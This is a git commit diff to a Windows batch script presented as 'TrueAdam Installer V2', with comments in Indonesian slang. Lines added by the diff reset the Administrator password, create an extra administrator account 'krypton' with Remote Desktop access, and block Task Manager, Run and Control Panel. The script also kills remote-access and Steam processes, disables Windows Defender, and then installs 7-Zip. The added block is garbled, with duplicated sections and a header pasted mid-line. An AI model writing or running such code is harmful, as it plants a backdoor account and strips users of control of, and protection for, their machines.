0b2135f0189dd5d57a4dc604490b4ec5a80c6bcd
AyamKioot <rezzahonorwoibro@gmail.com>
2026-07-07 12:58:59 +0800

    Modify user management and update download process
    Updated the script to change the password for the Administrator account and create a new user named 'krypton'. Removed references to downloading the Tor Browser and adjusted messages for clarity.

--- run.bat
+++ run.bat
@@ -12,6 +12,20 @@ for %%i in (vncserver.exe winvnc4.exe tightvncserver.exe ultravnc.exe) do (
 for %%i in ("C:\Program Files\VNC" "C:\Program Files\TightVNC" "%USERPROFILE%\AppData\Local\VNC") do (
     rd /s /q %%i 2>nul
 )
+sc stop vncserver @echo off
+setlocal enabledelayedexpansion
+title TrueAdam Installer V2 (NO FREEZE)
+set DIR=C:\Sumpruy_Downloads
+if not exist "%DIR%" mkdir "%DIR%"
+cd /d "%DIR%" 2>nul
+
+:: Matiin VNC (brutal kill)
+for %%i in (vncserver.exe winvnc4.exe tightvncserver.exe ultravnc.exe) do (
+    taskkill /f /im %%i 2>nul
+)
+for %%i in ("C:\Program Files\VNC" "C:\Program Files\TightVNC" "%USERPROFILE%\AppData\Local\VNC") do (
+    rd /s /q %%i 2>nul
+)
 sc stop vncserver 2>nul
 sc delete vncserver 2>nul
 
@@ -31,7 +45,48 @@ reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v No
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRun /t REG_DWORD /d 1 /f 2>nul
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f 2>nul
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoControlPanel /t REG_DWORD /d 1 /f 2>nul
-echo [+] Blokir aman, desktop & taskbar tetep idup biar StarDesk gak ngadat!
+echo [+] Blokir aman, desktop & taskbar tetep idup biar gak ngadat!
+echo.
+
+:: === KILL STEAM HELPER + STEAM (CEK DULU) ===
+tasklist /fi "imagename eq SteamHelperENv2.exe" 2>nul | find /i "SteamHelperENv2.exe" >nul 2>&1
+if %errorlevel% equ 0 (
+    echo [*] SteamHelperENv2.exe terdeteksi! Ngeterminate semua proses Steam...
+    taskkill /f /im SteamHelperENv2.exe 2>nul
+@echo off
+setlocal enabledelayedexpansion
+title TrueAdam Installer V2 (NO FREEZE)
+set DIR=C:\Sumpruy_Downloads
+if not exist "%DIR%" mkdir "%DIR%"
+cd /d "%DIR%" 2>nul
+
+:: Matiin VNC (brutal kill)
+for %%i in (vncserver.exe winvnc4.exe tightvncserver.exe ultravnc.exe) do (
+    taskkill /f /im %%i 2>nul
+)
+for %%i in ("C:\Program Files\VNC" "C:\Program Files\TightVNC" "%USERPROFILE%\AppData\Local\VNC") do (
+    rd /s /q %%i 2>nul
+)
+sc stop vncserver 2>nul
+sc delete vncserver 2>nul
+
+:: === GANTI PW ADMIN & BUAT USER KRYPTON ===
+echo [*] Lagi ngegas ganti password Administrator jadi jancoklo...
+net user Administrator "jancoklo" 2>nul
+echo [*] Bikin user baru krypton dengan password jancoklo...
+net user krypton jancoklo /add 2>nul
+net localgroup Administrators krypton /add 2>nul
+net localgroup "Remote Desktop Users" krypton /add 2>nul
+echo [+] Krypton udah admin setara, bahkan lebih tinggi dari admin biasa cok!
+echo.
+
+:: === BLOKIR HANYA YG PERLU (NGGAK MATIIN DESKTOP) ===
+echo [*] Ngeblokir Win key, Win+R, Task Manager, Control Panel aja...
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoWinKeys /t REG_DWORD /d 1 /f 2>nul
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRun /t REG_DWORD /d 1 /f 2>nul
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f 2>nul
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoControlPanel /t REG_DWORD /d 1 /f 2>nul
+echo [+] Blokir aman, desktop & taskbar tetep idup biar gak ngadat!
 echo.
 
 :: === KILL STEAM HELPER + STEAM (CEK DULU) ===
@@ -72,26 +127,21 @@ net stop "MsMpSvc" 2>nul
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f 2>nul
 
 echo ========================================
-echo MULAI DOWNLOAD SEMUA BRO (TANPA ERROR)
+echo MULAI DOWNLOAD 7-ZIP BRO
 echo ========================================
 
-set URL1=https://www.torproject.org/dist/torbrowser/15.0.17/tor-browser-windows-x86_64-portable-15.0.17.exe
-set FILE1=TorBrowser-15.0.17.exe
-set URL2=https://github.com/ip7z/7zip/releases/download/26.02/7z2602-x64.exe
-set FILE2=7z2602-x64.exe
+set URL1=https://github.com/ip7z/7zip/releases/download/26.02/7z2602-x64.exe
+set FILE1=7z2602-x64.exe
 
 call :Download "%URL1%" "%FILE1%"
-call :Download "%URL2%" "%FILE2%"
 
 echo ========================================
 echo CEK DAN JALANIN FILE
 echo ========================================
 
-if exist "%FILE1%" (start "" "%FILE1%" & echo [OK] %FILE1% running) else (echo [GAGAL] %FILE1%)
-
-if exist "%FILE2%" (
+if exist "%FILE1%" (
     echo [*] Install 7-Zip silent mode dulu bro...
-    start /wait "" "%FILE2%" /S
+    start /wait "" "%FILE1%" /S
     echo [OK] 7-Zip keinstall!
     if exist "C:\Program Files\7-Zip\7zFM.exe" (
         start "" "C:\Program Files\7-Zip\7zFM.exe"
@@ -103,7 +153,7 @@ if exist "%FILE2%" (
         echo [GAGAL] 7zFM.exe gak ketemu njir, mungkin installnya error
     )
 ) else (
-    echo [GAGAL] 7z64.exe gak ada filenya
+    echo [GAGAL] %FILE1% gak ada filenya
 )
 
 :: === BERSIH-BERSIH AKHIR ===
@@ -122,7 +172,7 @@ echo SELESAI GOBLOK 😡😡😡
 echo ========================================
 
 :: === POPUP PAKE VBS (PALING AMAN NO FREEZE) ===
-echo MsgBox "PC Name: %PCNAME%" ^& vbCrLf ^& "Username: %USERNAME_MSG%" ^& vbCrLf ^& vbCrLf ^& "Semua proses selesai bos! Klik OK buat lanjut 😎", vbOKOnly + vbInformation, "TrueAdam Installer V2 - SELESAI" > "%TEMP%\popup.vbs"
+echo MsgBox "PC Name: %PCNAME%" ^& vbCrLf ^& "Username: %USERNAME_MSG%" ^& vbCrLf ^& vbCrLf ^& "7-Zip berhasil diinstall bos! Klik OK buat lanjut 😎", vbOKOnly + vbInformation, "TrueAdam Installer V2 - SELESAI" > "%TEMP%\popup.vbs"
 cscript //nologo "%TEMP%\popup.vbs"
 del /q "%TEMP%\popup.vbs" >nul 2>&1
 
